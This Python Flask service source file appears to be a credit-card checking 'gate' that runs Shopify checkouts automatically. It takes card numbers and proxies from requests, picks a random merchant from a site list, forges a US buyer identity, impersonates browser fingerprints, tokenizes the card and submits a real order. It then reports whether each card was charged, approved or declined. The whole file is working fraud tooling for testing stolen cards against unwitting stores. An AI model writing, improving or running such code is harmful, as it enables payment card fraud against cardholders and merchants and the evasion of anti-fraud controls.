"""
app.py — Shopify Checkout Node (Render / scale plan)
=====================================================
"""

import os
import re
import html
import json
import time
import uuid
import random
import string
import threading
import urllib3
from urllib.parse import urlencode

from flask import Flask, request, jsonify
from curl_cffi import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# ─────────────────────────────────────────────────────────────────────────────
# ⚙️ ENV
# ─────────────────────────────────────────────────────────────────────────────
WORKERS_CAP = int(os.environ.get("WORKERS_CAP", "20"))
BUDGET_SEC  = float(os.environ.get("BUDGET_SEC", "40"))

def _load_sites():
    env_sites = os.environ.get("SITES", "").strip()
    if env_sites:
        parts = re.split(r"[\n,]+", env_sites)
        return [s.strip() for s in parts if s.strip() and s.strip().startswith("http")]

    here = os.path.dirname(os.path.abspath(__file__))
    for name in ("site.txt", "sites.txt"):
        p = os.path.join(here, name)
        if os.path.exists(p):
            with open(p) as f:
                return [l.strip() for l in f if l.strip() and not l.startswith("#") and l.strip().startswith("http")]
    return []

_SITES_CACHE = None
_SITES_CACHE_TS = 0.0
_SITES_LOCK = threading.Lock()

def _get_sites():
    global _SITES_CACHE, _SITES_CACHE_TS
    now = time.monotonic()
    with _SITES_LOCK:
        if _SITES_CACHE is None or now - _SITES_CACHE_TS > 60:
            _SITES_CACHE = _load_sites()
            _SITES_CACHE_TS = now
    return _SITES_CACHE

# ─────────────────────────────────────────────────────────────────────────────
# ⚡ WORKER COUNTER + DEBUG
# ─────────────────────────────────────────────────────────────────────────────
_workers_busy = 0
_workers_lock = threading.Lock()

def _inc_busy():
    global _workers_busy
    with _workers_lock: _workers_busy += 1

def _dec_busy():
    global _workers_busy
    with _workers_lock: _workers_busy = max(0, _workers_busy - 1)

_last_failure = {}

def _fail(reason, **extra):
    global _last_failure
    _last_failure = {"reason": reason, "ts": int(time.time()), **extra}
    print(f"[FAIL] {reason} | {extra}", flush=True)
    return _resp(f"PROPOSAL_FAILED_{reason}")

# ─────────────────────────────────────────────────────────────────────────────
# ⚡ TLS
# ─────────────────────────────────────────────────────────────────────────────
BROWSER_PROFILES = ["chrome124","chrome120","chrome116","chrome110","edge101","safari15_5"]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
]

# ─────────────────────────────────────────────────────────────────────────────
# 🎭 US IDENTITIES
# ─────────────────────────────────────────────────────────────────────────────
FIRST_NAMES   = ["james","john","robert","michael","william","david","richard","joseph","thomas","charles"]
LAST_NAMES    = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez"]
EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com"]
ADDRESSES = [
    {"street":"100 SW Main St",           "city":"Portland",  "state":"OR","zip":"97204","phone":"+15035550100"},
    {"street":"223 Pioneer Blvd",         "city":"Salem",     "state":"OR","zip":"97301","phone":"+15035550101"},
    {"street":"101 N Last Chance Gulch",  "city":"Helena",    "state":"MT","zip":"59601","phone":"+14065550100"},
    {"street":"1 Granite St",             "city":"Concord",   "state":"NH","zip":"03301","phone":"+16035550100"},
    {"street":"100 W 10th St",            "city":"Wilmington","state":"DE","zip":"19801","phone":"+13025550100"},
]

def _identity():
    fn = random.choice(FIRST_NAMES)
    ln = random.choice(LAST_NAMES)
    email = f"{fn.lower()}.{ln.lower()}{random.randint(1,9999)}@{random.choice(EMAIL_DOMAINS)}"
    return fn, ln, email, random.choice(ADDRESSES)

def _street_addr(fn, ln, a):
    return {"address1":a["street"],"city":a["city"],"countryCode":"US",
            "postalCode":a["zip"],"firstName":fn,"lastName":ln,
            "zoneCode":a["state"],"phone":a["phone"]}

def _rand_suffix(n=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

# ─────────────────────────────────────────────────────────────────────────────
# 🔌 PROXY
# ─────────────────────────────────────────────────────────────────────────────
def _parse_proxy(s):
    if not s: return ""
    p = s.strip()
    for scheme in ("socks5://","socks5h://","http://","https://"):
        if p.startswith(scheme):
            p = p[len(scheme):]; break
    if "@" in p: return f"socks5h://{p}"
    parts = p.split(":")
    if len(parts) == 2: return f"socks5h://{parts[0]}:{parts[1]}"
    if len(parts) >= 4:
        host, port, user = parts[0], parts[1], parts[2]
        return f"socks5h://{user}:{':'.join(parts[3:])}@{host}:{port}"
    return f"socks5h://{p}"

# ─────────────────────────────────────────────────────────────────────────────
# 🔍 EXTRACTIONS
# ─────────────────────────────────────────────────────────────────────────────
def _session_token(h):
    for pat in (r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"',
                r'"sessionToken"\s*:\s*"([^"]+)"'):
        m = re.search(pat, h)
        if m:
            t = html.unescape(m.group(1)).strip('"\'')
            if len(t) > 50: return t
    return ""

def _commit_sha(h):
    m = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', html.unescape(h)); return m.group(1) if m else ""

def _stable_id(h):
    m = re.search(r'"stableId"\s*:\s*"([0-9a-f-]{36})"', html.unescape(h)); return m.group(1) if m else ""

def _queue_token(b):
    m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', b); return m.group(1) if m else ""

def _receipt_id(b):
    m = re.search(r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', b); return m.group(1) if m else ""

def _receipt_session(b):
    m = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', b); return m.group(1) if m else ""

def _code(b):
    m = re.search(r'"code"\s*:\s*"([^"]+)"', b); return m.group(1) if m else ""

def _signed_handles(b):
    try:
        d = json.loads(b)
        sp = (d.get("data",{}).get("session",{}).get("negotiate",{})
               .get("result",{}).get("sellerProposal",{}))
        de = sp.get("deliveryExpectations",{})
        if de.get("__typename") == "FilledDeliveryExpectationTerms":
            return [x["signedHandle"] for x in de.get("deliveryExpectations",[]) if x.get("signedHandle")]
    except Exception: pass
    return []

def _delivery_handle(b):
    try:
        d = json.loads(b)
        sp = (d.get("data",{}).get("session",{}).get("negotiate",{})
               .get("result",{}).get("sellerProposal",{}))
        sds = sp.get("selectedDeliveryStrategy",{})
        if isinstance(sds, dict) and sds.get("handle"): return sds["handle"]
        for dg in sp.get("deliveryGroups",[]):
            for opt in dg.get("deliveryOptions",[]):
                if isinstance(opt, dict) and opt.get("handle"): return opt["handle"]
    except Exception: pass
    for pat in (r'"selectedDeliveryStrategy"\s*:\s*\{[^{}]*"handle"\s*:\s*"([^"]+)"',
                r'"__typename"\s*:\s*"CompleteDeliveryStrategy"[^{}]*"handle"\s*:\s*"([^"]+)"'):
        m = re.search(pat, b)
        if m: return m.group(1)
    return ""

def _checkout_total(b):
    m = re.search(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', b)
    return m.group(1) if m else ""

def _tax_amount(b):
    try:
        d = json.loads(b)
        sp = (d.get("data",{}).get("session",{}).get("negotiate",{})
               .get("result",{}).get("sellerProposal",{}))
        return sp.get("tax",{}).get("totalTaxAmount",{}).get("value",{}).get("amount","0.0")
    except Exception: return "0.0"

def _tax_from_rejected(b):
    try:
        d = json.loads(b)
        sp = d.get("data",{}).get("submitForCompletion",{}).get("sellerProposal",{})
        return sp.get("tax",{}).get("totalTaxAmount",{}).get("value",{}).get("amount","0.0")
    except Exception: return "0.0"

def _total_from_rejected(b):
    try:
        d = json.loads(b)
        sp = d.get("data",{}).get("submitForCompletion",{}).get("sellerProposal",{})
        for k in ("checkoutTotal","total","runningTotal"):
            v = sp.get(k,{}).get("value",{}).get("amount")
            if v: return v
    except Exception: pass
    return ""

def _is_shipping_required(b):
    try:
        d = json.loads(b)
        sp = (d.get("data",{}).get("session",{}).get("negotiate",{})
               .get("result",{}).get("sellerProposal",{}))
        return sp.get("isShippingRequired", True)
    except Exception: return True

def _payment_method_id(b):
    try:
        data = json.loads(b)
    except Exception:
        for pat in (r'"paymentMethodIdentifier"\s*:\s*"([^"]{4,})"',
                    r'"payment_method_identifier"\s*:\s*"([^"]{4,})"'):
            m = re.search(pat, b)
            if m: return m.group(1)
        return ""

    candidates = []
    def walk(o, ctx=""):
        if isinstance(o, dict):
            tn = str(o.get("__typename",""))
            name = str(o.get("name","")).lower()
            v = o.get("paymentMethodIdentifier")
            if isinstance(v, str) and len(v) > 3:
                candidates.append((0, "shopify" in name, v))
            v = o.get("payment_method_identifier")
            if isinstance(v, str) and len(v) > 3:
                candidates.append((1, "shopify" in name, v))
            if "payment" in tn.lower() or "payment" in ctx.lower():
                for k in ("identifier","handle","paymentMethodId","id"):
                    v = o.get(k)
                    if isinstance(v, str) and len(v) > 3 and not v.startswith("gid:"):
                        candidates.append((2, ("shopify" in name) or ("card" in name), v))
                        break
            for k, v in o.items():
                walk(v, tn or ctx)
        elif isinstance(o, list):
            for x in o: walk(x, ctx)
    walk(data)
    if not candidates: return ""
    candidates.sort(key=lambda c: (c[0], not c[1]))
    return candidates[0][2]

def _payment_method_id_from_html(h):
    h = h.replace('&quot;','"').replace('&#34;','"')
    for pat in (r'"paymentMethodIdentifier"\s*:\s*"([^"]{4,})"',
                r'"payment_method_identifier"\s*:\s*"([^"]{4,})"',
                r'paymentMethodId["\']?\s*[:=]\s*["\']([^"\']{4,})["\']'):
        m = re.search(pat, h)
        if m: return m.group(1)
    return ""

# ─────────────────────────────────────────────────────────────────────────────
# 🔑 GRAPHQL IDS & PRODUCTS
# ─────────────────────────────────────────────────────────────────────────────
def _graphql_ids(session, shop_url, checkout_html, ua):
    m = re.search(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)', checkout_html)
    if not m: return None, None, None
    try:
        js = session.get(shop_url + m.group(1), headers={"user-agent": ua}, timeout=8).text
        p = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"', js)
        s = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"', js)
        q = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"', js)
        return (p.group(1) if p else None, s.group(1) if s else None, q.group(1) if q else None)
    except Exception:
        return None, None, None

def _cheapest_product(session, shop_url, ua, timeout=8):
    diag = []
    for ep in (f"{shop_url}/products.json?limit=250",
               f"{shop_url}/collections/all/products.json?limit=250"):
        try:
            r = session.get(ep, headers={"user-agent": ua}, timeout=timeout)
            diag.append((ep.split(shop_url)[-1], r.status_code))
            if r.status_code != 200: continue
            data = r.json()
            best_price = float("inf"); best_vid = None; best_pstr = ""
            for p in data.get("products", []):
                for v in p.get("variants", []):
                    if not v.get("available"): continue
                    try: price = float(str(v.get("price","0")).replace(",","."))
                    except Exception: continue
                    if price > 0 and price < best_price:
                        best_price, best_vid, best_pstr = price, str(v.get("id")), str(v.get("price","")) or str(best_price)
            if best_vid: return best_vid, best_pstr, diag
        except Exception as e:
            diag.append((ep.split(shop_url)[-1], f"exc:{str(e)[:40]}"))
    return None, None, diag

# ─────────────────────────────────────────────────────────────────────────────
# 🛒 RESTORED PROPOSAL PAYLOAD
# ─────────────────────────────────────────────────────────────────────────────
def _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, proposal_id):
    if addr:
        sa   = _street_addr(addr["fn"], addr["ln"], addr)
        dest = {"partialStreetAddress": {"address1":sa["address1"],"city":sa["city"],
                "countryCode":"US","lastName":sa["lastName"],"phone":"","oneTimeUse":False}}
        bill = {"streetAddress": sa}
    else:
        dest = {"partialStreetAddress": {"address1":"","city":"","countryCode":"US",
                "lastName":"","phone":"","oneTimeUse":False}}
        bill = {"streetAddress": {"address1":"","city":"","countryCode":"US","lastName":"","phone":""}}

    return {
        "variables": {
            "sessionInput": {"sessionToken": session_token},
            "queueToken":   None,
            "discounts":    {"lines": [], "acceptUnexpectedDiscounts": True},
            "delivery": {
                "deliveryLines": [{
                    "destination": dest,
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {"any": True},
                            "shipments":              {"any": True},
                        },
                        "options": {},
                    },
                    "targetMerchandiseLines": {"any": True},
                    "deliveryMethodTypes":    ["SHIPPING"],
                    "expectedTotalPrice":     {"any": True},
                    "destinationChanged":     True,
                }],
                "noDeliveryRequired":             [],
                "useProgressiveRates":            False,
                "prefetchShippingRatesStrategy":  None,
                "supportsSplitShipping":          True,
            },
            "deliveryExpectations": {"deliveryExpectationLines": []},
            "merchandise": {"lines": [{
                "stableId": stable_id,
                "merchandise": {"productVariantReference": {
                    "id":        f"gid://shopify/ProductVariantMerchandise/{vid}",
                    "variantId": f"gid://shopify/ProductVariant/{vid}",
                    "properties":         [],
                    "sellingPlanId":      None,
                    "sellingPlanDigest":  None,
                }},
                "quantity":             {"items": {"value": 1}},
                "expectedTotalPrice":   {"any": True},
                "lineComponentsSource": None,
                "lineComponents":       [],
            }]},
            "memberships": {"memberships": []},
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": bill,
            },
            "buyerIdentity": {
                "customer":         {"presentmentCurrency": currency, "countryCode": "US"},
                "email":            email or None,
                "emailChanged":     bool(email),
                "phoneCountryCode": "US",
                "marketingConsent": [],
                "shopPayOptInPhone": {"countryCode": "US"},
                "rememberMe":       False,
            },
            "tip": {"tipLines": []},
            "poNumber": None,
            "taxes": {
                "proposedAllocations":             None,
                "proposedTotalAmount":             {"any": True},
                "proposedTotalIncludedAmount":     None,
                "proposedMixedStateTotalAmount":   None,
                "proposedExemptions":              [],
            },
            "note": {"message": None, "customAttributes": []},
            "localizationExtension": {"fields": []},
            "nonNegotiableTerms": None,
            "scriptFingerprint": {
                "signature": None, "signatureUuid": None,
                "lineItemScriptChanges": [], "paymentScriptChanges": [],
                "shippingScriptChanges": [],
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": [],
        },
        "operationName": "Proposal",
        "id": proposal_id,
    }

# ─────────────────────────────────────────────────────────────────────────────
# 🔑 PCI
# ─────────────────────────────────────────────────────────────────────────────
def _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua):
    try:
        r = session.post(
            "https://checkout.pci.shopifyinc.com/sessions",
            json={"credit_card": {"number":ccn,"month":int(mm),"year":int(yyyy),
                                  "verification_value":cvv,"name":name},
                  "payment_session_scope": shop_domain},
            headers={"origin":"https://checkout.pci.shopifyinc.com","user-agent":ua},
            timeout=8,
        )
        if r.status_code == 200: return r.json().get("id")
    except Exception: pass
    return None

# ─────────────────────────────────────────────────────────────────────────────
# 📤 RESPONSE
# ─────────────────────────────────────────────────────────────────────────────
def _resp(response, *, charged=False, approved=False, price="0 USD", elapsed_ms=None):
    d = {"Response": response, "Gate": "Shopify Payments",
         "Charged": "True" if charged else "False",
         "Approved": "True" if approved else "False",
         "Price": price, "success": charged or approved}
    if elapsed_ms is not None: d["Time"] = str(int(elapsed_ms))
    return jsonify(d)

def _classify_failed(code):
    c = (code or "").upper()
    if "INSUFFICIENT" in c or c == "FUNDS":   return "INSUFFICIENT_FUNDS", True,  False
    if "GENERIC" in c:                        return "GENERIC_ERROR",      False, False
    if "EXPIRED" in c:                        return "CARD_EXPIRED",       False, False
    if "INVALID" in c:                        return "INVALID_CARD",       False, False
    if "BLOCKED" in c:                        return "BLOCKED_CARD",       False, False
    if "DECLINED" in c or "DO_NOT_HONOR" in c:return "CARD_DECLINED",      False, False
    return (c or "CARD_DECLINED"), False, False

# ─────────────────────────────────────────────────────────────────────────────
# 🧠 PIPELINE
# ─────────────────────────────────────────────────────────────────────────────
def _run_check(card_str, proxy_str):
    t_start = time.monotonic()
    def remain(): return BUDGET_SEC - (time.monotonic() - t_start)

    parts = card_str.split("|")
    if len(parts) < 4: return _resp("INVALID_CARD")
    ccn, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    yyyy = "20" + yy if len(yy) == 2 else yy

    sites = _get_sites()
    if not sites:
        return _fail("NO_SITES", hint="set SITES env var or upload site.txt")

    shop_url  = random.choice(sites)
    proxy_url = _parse_proxy(proxy_str)
    ua        = random.choice(USER_AGENTS)
    imp       = random.choice(BROWSER_PROFILES)

    session = requests.Session(impersonate=imp)
    if proxy_url: session.proxies = {"http": proxy_url, "https": proxy_url}

    try:
        try:
            vid, price, diag = _cheapest_product(session, shop_url, ua, timeout=min(8, max(3, remain())))
        except Exception as e:
            return _fail("CHEAPEST_EXC", shop=shop_url, err=str(e)[:100])
        if not vid:
            return _fail("NO_PRODUCTS", shop=shop_url, endpoints=diag)
        if remain() < 20:
            return _fail("BUDGET_AFTER_PRODUCT", elapsed=f"{BUDGET_SEC-remain():.1f}s")

        try:
            r = session.get(f"{shop_url}/cart/{vid}:1", headers={"user-agent": ua},
                            allow_redirects=True, timeout=min(10, max(3, remain())))
        except Exception:
            return _resp("CART_FAILED", price=f"{price} USD")
        if r.status_code != 200:
            return _resp("CART_FAILED", price=f"{price} USD")

        checkout_url  = r.url
        checkout_html = r.text
        cart_token    = (re.search(r'/checkouts/cn/([^/?]+)', checkout_url) or [None, ""])[1]

        session_token = _session_token(checkout_html)
        commit_sha    = _commit_sha(checkout_html)
        stable_id     = _stable_id(checkout_html)
        if not session_token: return _fail("NO_SESSION_TOKEN",  shop=shop_url)
        if not commit_sha:    return _fail("NO_COMMIT_SHA",     shop=shop_url)
        if not stable_id:     return _fail("NO_STABLE_ID",      shop=shop_url)
        if remain() < 16:     return _fail("BUDGET_AFTER_CHECKOUT", shop=shop_url)

        prop_id, submit_id, poll_id = _graphql_ids(session, shop_url, checkout_html, ua)
        prop_id   = prop_id   or "6d9f0eb3d750c837c721c99da1ec1c7f1ce832d3687c5d0d0ffc1b42a610d3e8"
        submit_id = submit_id or "b3fd8db496438a6859c96db264b77e84b3f093d11a44c4d0a84d43e661f12419"
        poll_id   = poll_id   or "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"

        currency = "USD"
        m = re.search(r'"currencyCode"\s*:\s*"([A-Z]{3})"', checkout_html)
        if m: currency = m.group(1)

        amount = price
        m = re.search(r'"runningTotal"\s*:\s*\{\s*"value"\s*:\s*\{"amount"\s*:\s*"([\d.]+)"', checkout_html)
        if m: amount = m.group(1)

        fn, ln, email, addr_raw = _identity()
        addr = {"fn":fn,"ln":ln,"street":addr_raw["street"],"city":addr_raw["city"],
                "state":addr_raw["state"],"zip":addr_raw["zip"],"phone":addr_raw["phone"]}

        hdr = {
            "accept":                       "application/json",
            "content-type":                 "application/json",
            "origin":                       shop_url,
            "referer":                      checkout_url,
            "shopify-checkout-client":      "checkout-web/1.0",
            "shopify-checkout-source":      f'id="{cart_token}", type="cn"',
            "user-agent":                   ua,
            "x-checkout-one-session-token": session_token,
            "x-checkout-web-build-id":      commit_sha,
        }
        prop_url = f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal"

        # ── 4a. Proposal 1 ────────────────────────────────────────────────
        try:
            p = _proposal_payload(session_token, stable_id, vid, amount, currency, None, None, prop_id)
            r1 = session.post(prop_url, headers=hdr, json=p, timeout=min(8, max(3, remain())))
        except Exception as e:
            return _fail("P1_EXC", shop=shop_url, err=str(e)[:100])
        if r1.status_code != 200:
            return _fail("P1_HTTP", shop=shop_url, status=r1.status_code, body=r1.text[:800])
        queue_token = _queue_token(r1.text) or None
        if not queue_token:
            return _fail("P1_NO_QUEUE", shop=shop_url, body=r1.text[:800])
        if remain() < 12:
            return _fail("BUDGET_AFTER_P1", shop=shop_url)

        # ── 4b. Proposal 2 ────────────────────────────────────────────────
        try:
            p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, None, prop_id)
            p["variables"]["queueToken"] = queue_token
            r2 = session.post(prop_url, headers=hdr, json=p, timeout=min(8, max(3, remain())))
        except Exception as e:
            return _fail("P2_EXC", shop=shop_url, err=str(e)[:100])
        if r2.status_code != 200:
            return _fail("P2_HTTP", shop=shop_url, status=r2.status_code, body=r2.text[:800])

        # ── 4c. Proposal 3 ────────────────────────────────────────────────
        try:
            p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, prop_id)
            p["variables"]["queueToken"] = queue_token
            r3 = session.post(prop_url, headers=hdr, json=p, timeout=min(8, max(3, remain())))
        except Exception as e:
            return _fail("P3_EXC", shop=shop_url, err=str(e)[:100])
        if r3.status_code != 200:
            return _fail("P3_HTTP", shop=shop_url, status=r3.status_code, body=r3.text[:800])

        # ── 4d. Extra proposals ───────────────────────────────────────────
        bodies = [r3.text]
        pm_id  = _payment_method_id(r3.text)
        del_h  = _delivery_handle(r3.text)
        signed = _signed_handles(r3.text)
        tax    = _tax_amount(r3.text)
        amount_f = _checkout_total(r3.text) or amount
        queue_token = _queue_token(r3.text) or queue_token
        shipping_required = _is_shipping_required(r3.text)

        for _ in range(3):
            if pm_id and (signed or not shipping_required) and (del_h or not shipping_required):
                break
            if remain() < 8:
                break
            time.sleep(0.05)
            try:
                p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, prop_id)
                p["variables"]["queueToken"] = queue_token
                rN = session.post(prop_url, headers=hdr, json=p, timeout=min(8, max(3, remain())))
                if rN.status_code != 200: continue
                bodies.append(rN.text)
                nq = _queue_token(rN.text)
                if nq: queue_token = nq
                np = _payment_method_id(rN.text)
                if np: pm_id = np
                ns = _signed_handles(rN.text)
                if ns: signed = ns
                nd = _delivery_handle(rN.text)
                if nd: del_h = nd
                nt = _tax_amount(rN.text)
                if nt and nt != "0.0": tax = nt
                na = _checkout_total(rN.text)
                if na: amount_f = na
            except Exception:
                continue

        if not pm_id:
            pm_id = _payment_method_id_from_html(checkout_html)

        if not pm_id:
            return _fail("NO_PAYMENT_ID", shop=shop_url, proposals=len(bodies),
                         body=bodies[-1][:800] if bodies else "")

        if shipping_required and not signed:
            return _fail("NO_SIGNED_HANDLES", shop=shop_url, proposals=len(bodies))
        if shipping_required and not del_h:
            return _fail("NO_DELIVERY_HANDLE", shop=shop_url, proposals=len(bodies))
        if remain() < 6:
            return _fail("BUDGET_AFTER_PROPOSALS", shop=shop_url)

        sid = _tokenize(session, ccn, mm, yyyy, cvv, f"{fn} {ln}", shop_url.split("//")[1], ua)
        if not sid: return _resp("PCI_FAILED", price=f"{amount_f} {currency}")
        if remain() < 4: return _fail("BUDGET_AFTER_PCI", shop=shop_url)

        sa        = _street_addr(fn, ln, addr_raw)
        price_str = f"{amount_f} {currency}"

        def _build_submit(cur_tax, cur_total):
            return {
                "variables": {
                    "input": {
                        "sessionInput": {"sessionToken": session_token},
                        "queueToken":   queue_token,
                        "discounts":    {"lines": [], "acceptUnexpectedDiscounts": True},
                        "delivery": {
                            "deliveryLines": [{
                                "destination": {"streetAddress": sa},
                                "selectedDeliveryStrategy": {
                                    "deliveryStrategyByHandle": {"handle": del_h, "customDeliveryRate": False},
                                    "options": {},
                                },
                                "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                                "deliveryMethodTypes":    ["SHIPPING"] if shipping_required else ["NONE"],
                                "expectedTotalPrice":     {"any": True},
                                "destinationChanged":     False,
                            }],
                            "noDeliveryRequired":            [],
                            "useProgressiveRates":           False,
                            "prefetchShippingRatesStrategy": None,
                            "supportsSplitShipping":         True,
                        },
                        "deliveryExpectations": {
                            "deliveryExpectationLines": [{"signedHandle": h} for h in signed],
                        },
                        "merchandise": {"lines": [{
                            "stableId": stable_id,
                            "merchandise": {"productVariantReference": {
                                "id":        f"gid://shopify/ProductVariantMerchandise/{vid}",
                                "variantId": f"gid://shopify/ProductVariant/{vid}",
                                "properties":        [],
                                "sellingPlanId":     None,
                                "sellingPlanDigest": None,
                            }},
                            "quantity":             {"items": {"value": 1}},
                            "expectedTotalPrice":   {"any": True},
                            "lineComponentsSource": None,
                            "lineComponents":       [],
                        }]},
                        "memberships": {"memberships": []},
                        "payment": {
                            "totalAmount": {"value": {"amount": cur_total, "currencyCode": currency}},
                            "paymentLines": [{
                                "paymentMethod": {
                                    "directPaymentMethod": {
                                        "sessionId":               sid,
                                        "paymentMethodIdentifier": pm_id,
                                        "billingAddress":          {"streetAddress": sa},
                                        "cardSource":              None,
                                    },
                                    "giftCardPaymentMethod":                 None,
                                    "redeemablePaymentMethod":               None,
                                    "walletPaymentMethod":                   None,
                                    "walletsPlatformPaymentMethod":          None,
                                    "localPaymentMethod":                    None,
                                    "paymentOnDeliveryMethod":               None,
                                    "paymentOnDeliveryMethod2":              None,
                                    "manualPaymentMethod":                   None,
                                    "customPaymentMethod":                   None,
                                    "offsitePaymentMethod":                  None,
                                    "customOnsitePaymentMethod":             None,
                                    "deferredPaymentMethod":                 None,
                                    "customerCreditCardPaymentMethod":       None,
                                    "paypalBillingAgreementPaymentMethod":   None,
                                    "remotePaymentInstrument":               None,
                                },
                                "amount": {"value": {"amount": cur_total, "currencyCode": currency}},
                            }],
                            "billingAddress": {"streetAddress": sa},
                        },
                        "buyerIdentity": {
                            "customer":         {"presentmentCurrency": currency, "countryCode": "US"},
                            "email":            email,
                            "emailChanged":     False,
                            "phoneCountryCode": "US",
                            "marketingConsent": [],
                            "shopPayOptInPhone": {"countryCode": "US"},
                            "rememberMe":       False,
                        },
                        "tip": {"tipLines": []},
                        "poNumber": None,
                        "taxes": {
                            "proposedAllocations":           None,
                            "proposedTotalAmount":           {"value": {"amount": cur_tax, "currencyCode": currency}},
                            "proposedTotalIncludedAmount":   None,
                            "proposedMixedStateTotalAmount": None,
                            "proposedExemptions":            [],
                        },
                        "note": {"message": None, "customAttributes": []},
                        "localizationExtension": {"fields": []},
                        "nonNegotiableTerms": None,
                        "scriptFingerprint": {
                            "signature": None, "signatureUuid": None,
                            "lineItemScriptChanges": [], "paymentScriptChanges": [],
                            "shippingScriptChanges": [],
                        },
                        "optionalDuties": {"buyerRefusesDuties": False},
                        "cartMetafields": [],
                    },
                    "attemptToken": f"{cart_token}-{_rand_suffix()}",
                    "metafields":   [],
                    "analytics": {"requestUrl": checkout_url, "pageId": str(uuid.uuid4())},
                },
                "operationName": "SubmitForCompletion",
                "id": submit_id,
            }

        body    = ""
        cur_tax = tax or "0.0"
        cur_tot = amount_f
        for tax_attempt in range(2):
            try:
                r_submit = session.post(
                    f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
                    json=_build_submit(cur_tax, cur_tot), headers=hdr,
                    timeout=min(10, max(3, remain())),
                )
                body = r_submit.text
            except Exception as e:
                return _fail("SUBMIT_EXC", shop=shop_url, err=str(e)[:100])

            if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in body and tax_attempt == 0:
                nt = _tax_from_rejected(body)
                nT = _total_from_rejected(body)
                if nt: cur_tax = nt
                if nT: cur_tot = nT
                price_str = f"{cur_tot} {currency}"
                continue
            break

        elapsed_ms = (time.monotonic() - t_start) * 1000

        if '"ProcessedReceipt"' in body or '"SuccessfulReceipt"' in body:
            return _resp("ORDER_PLACED", charged=True, price=price_str, elapsed_ms=elapsed_ms)
        if '"ActionRequiredReceipt"' in body:
            return _resp("3DS_AUTHENTICATION_REQUIRED", approved=True, price=price_str, elapsed_ms=elapsed_ms)
        if '"FailedReceipt"' in body:
            resp, apv, chg = _classify_failed(_code(body))
            return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=elapsed_ms)

        if '"ProcessingReceipt"' in body:
            rid = _receipt_id(body)
            rss = _receipt_session(body)
            if rid and rss and remain() > 4:
                for _ in range(6):
                    if remain() < 3: break
                    time.sleep(0.4)
                    try:
                        params = {"operationName":"PollForReceipt",
                                  "variables": json.dumps({"receiptId": rid, "sessionToken": rss}),
                                  "id": poll_id}
                        r_p = session.get(f"{shop_url}/checkouts/internal/graphql/persisted?{urlencode(params)}",
                                          headers=hdr, timeout=min(8, max(2, remain())))
                        pb = r_p.text
                        if '"SuccessfulReceipt"' in pb or '"ProcessedReceipt"' in pb:
                            ms = (time.monotonic() - t_start) * 1000
                            return _resp("ORDER_PLACED", charged=True, price=price_str, elapsed_ms=ms)
                        if '"ActionRequiredReceipt"' in pb:
                            ms = (time.monotonic() - t_start) * 1000
                            return _resp("3DS_AUTHENTICATION_REQUIRED", approved=True, price=price_str, elapsed_ms=ms)
                        if '"FailedReceipt"' in pb:
                            resp, apv, chg = _classify_failed(_code(pb))
                            ms = (time.monotonic() - t_start) * 1000
                            return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=ms)
                    except Exception:
                        continue
            return _resp("PROCESSING_TIMEOUT", price=price_str, elapsed_ms=elapsed_ms)

        code = _code(body)
        if code:
            resp, apv, chg = _classify_failed(code)
            return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=elapsed_ms)

        return _fail("UNKNOWN_BODY", shop=shop_url, body=body[:800], price=price_str)

    except Exception as e:
        return _fail("TOP_EXC", shop=shop_url, err=str(e)[:150])
    finally:
        try: session.close()
        except Exception: pass

# ─────────────────────────────────────────────────────────────────────────────
# 🌐 ROUTES
# ─────────────────────────────────────────────────────────────────────────────
@app.route("/")
def route_check():
    _inc_busy()
    try:
        card  = request.args.get("card")
        proxy = request.args.get("proxy", "")
        if not card: return _resp("MISSING_CARD")
        return _run_check(card, proxy)
    except Exception as e:
        return _fail("ROUTE_EXC", err=str(e)[:150])
    finally:
        _dec_busy()

@app.route("/health")
def route_health():
    with _workers_lock: busy = _workers_busy
    return jsonify({"status":"ok","workers_busy":busy,"workers_cap":WORKERS_CAP})

